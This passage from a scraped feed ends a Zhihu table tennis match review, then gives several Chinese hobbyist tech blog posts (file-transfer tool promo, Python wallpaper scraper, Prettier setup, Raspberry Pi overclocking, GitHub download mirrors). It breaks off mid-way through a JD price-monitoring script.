data-private-watermark-src=\"v2-85042454dd61639f45899ce9d1e54054\"></p>\n<p>第三局，王曼昱以雷霆之势登场，一度大比分领先。但随着几个接发的问题以及平野的运气球，气势有所回落，教练及时叫了暂停。暂停结束，王曼昱反手起板质量很高，落点在中路偏正手，非常完美。平野的移动速度似乎体现不出什么优势了。平野开始搏杀，但失误率很高，基本没有得分。最终王曼昱轻松获胜，11比3战胜平野！</p>\n<p>王曼昱在整场比赛中体现了极坚韧的意志，再加上护台优势，很多极被动的球都能扭转得分。到了第三局，平野已经没有什么办法了，只好搏杀，但又没有状态。相信以王曼昱的能力，加上奥运等大赛的磨炼，下个周期一定也会是国乒的中流砥柱。</p>\n<hr>\n<p>还没看够？不妨来看看孙颖莎与伊藤的第一次奥运对决：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/answer/2026457583\" class=\"internal\">叶子盛：2020 东京奥运会乒乓球女单半决赛孙颖莎 4:0 轻取伊藤美诚，如何评价本场比赛？</a><p><br></p>\n<hr>\n<p>奥运赛程众多，多数以文字简评方式进行赏析。笔者创建了一个专栏，目前收录了较为齐全的各场次简评，自忖在全网算做得最有诚意的之一了。见：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/column/c_1404020055374372864\" data-image=\"https://pic1.zhimg.com/v2-52a669542a8699d42a3c5796c7e536e9.jpg\" data-image-width=\"200\" data-image-height=\"200\" class=\"internal\">乒乓赛事简评</a><p>欢迎前去专栏对我付出精力更大的图文作品进行指正。无团队，无盈利，用爱发电。如果喜欢，欢迎关注（含多个编辑推荐等）：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/column/biqinzhai\" data-image=\"https://pic4.zhimg.com/v2-cde3d62e8270146ee8593adcb47189c4.jpg\" data-image-width=\"183\" data-image-height=\"183\" class=\"internal\">避秦斋</a><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/macaoleaf?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">叶子盛</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/477548190/answer/2041170193?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">494 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/475772055?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2020 东京奥运会乒乓球女单半决赛孙颖莎 4:0 轻取伊藤美诚，如何评价本场比赛？</a><br><a href=\"http://www.zhihu.com/question/475485375?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2020 东京奥运乒乓球女单 1/4 决赛石川佳纯 1:4 不敌对手出局，如何评价本场比赛？</a><br>\n","link":"http://www.zhihu.com/question/477548190/answer/2041170193?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何免费不限速传输文件？你应该试试 AirPortal！","date":"2021-07-30 10:50:00","description":"\n<p>微信传输限制 200M （电脑端 1GB），某度网盘的限速实在离谱。</p>\n<p>那么，如何快速、简单的传输文件呢？</p>\n<p>AirPortal 可以解决这个难题！</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E5%85%A8\" class=\"headerlink\" title=\"安全\"></a>安全</h2>\n<p>可以设置取件密码，在输入取件码的同时还要输入密码，进一步保护文件安全。</p>\n<p>可以设置下载次数，达到一定下载次数时自动从服务器上删除文件，无法下载。</p>\n<p>可以设置保存小时数，超过时间后自动从服务器上删除文件，无法下载。</p>\n<p>当用户多次输入错误的取件码时，将自动弹出验证码，核实是否为真实用户。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/c6da584dd68d5.png\"><h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E4%BE%BF%E5%BF%AB%E9%80%9F\" class=\"headerlink\" title=\"方便快速\"></a>方便快速</h2>\n<p>AirPortal 不限速，提供多地区服务器下载。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/2194e7359dab2.png\"><p>无论是否是高级用户，都将文件存储在 OSS，提高服务可用性与下载速度。</p>\n<p>无需多余的步骤，打开客户端或网页版输入取件码和密码（如有设置）就可以下载。</p>\n<p>在两台设备上登录同一个账号后，在其中任意一台设备上传文件，在另一台设备上会自动询问是否接收，无需输入取件码。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%85%8D%E7%99%BB%E5%BD%95%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"免登录使用\"></a>免登录使用</h3>\n<p>AirPortal 可以免登录使用，以下是一些限制：</p>\n<table>\n<thead><tr>\n<th align=\"center\">未登录</th>\n<th align=\"center\">免费</th>\n<th align=\"center\">高级</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\">无限流量</td>\n<td align=\"center\">无限流量</td>\n<td align=\"center\">10GB + 结余</td>\n</tr>\n<tr>\n<td align=\"center\">单次上传 1GB</td>\n<td align=\"center\">单次上传 2GB</td>\n<td align=\"center\">无限</td>\n</tr>\n</tbody>\n</table>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/1b7b87e798158.png\"><h3>\n<a href=\"https://blog.yfun.top/#%E7%AE%80%E6%B4%81%E7%9A%84%E9%A1%B5%E9%9D%A2\" class=\"headerlink\" title=\"简洁的页面\"></a>简洁的页面</h3>\n<p>没有花里胡哨的广告和弹窗，简洁明了，点击「发送」就可以发送文件或文字。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/3aa77007547f5.png\"><h3>\n<a href=\"https://blog.yfun.top/#Wi-Fi-%E5%BF%AB%E4%BC%A0\" class=\"headerlink\" title=\"Wi-Fi 快传\"></a>Wi-Fi 快传</h3>\n<p>在同一局域网下，使用客户端开启「Wi-Fi 快传」功能，文件传输不经过热铁盒服务器与公网，更快速，更安全。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%89%AA%E8%B4%B4%E6%9D%BF%E5%85%B1%E4%BA%AB\" class=\"headerlink\" title=\"剪贴板共享\"></a>剪贴板共享</h3>\n<p>基于 Wi-Fi 快传的剪贴板共享功能，可以轻松实现跨设备复制粘贴，零延迟，支持多种操作系统。</p>\n<p>（需要同时打开客户端并连接 Wi-Fi 快传，iOS 端将会以文本方式同步到客户端）</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%A4%9A%E5%B9%B3%E5%8F%B0\" class=\"headerlink\" title=\"多平台\"></a>多平台</h2>\n<p>拥有 iOS, 安卓, Windows, macOS 与 Linux 平台的客户端，其余平台也可以使用 网页端。</p>\n<p>官方网址：<a href=\"https://airportal.cn/\">https://airportal.cn/</a></p>\n<p>*: 感谢 AirPortal 空投的支持！</p> ","link":"https://blog.yfun.top/posts/2021/airportal/"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; 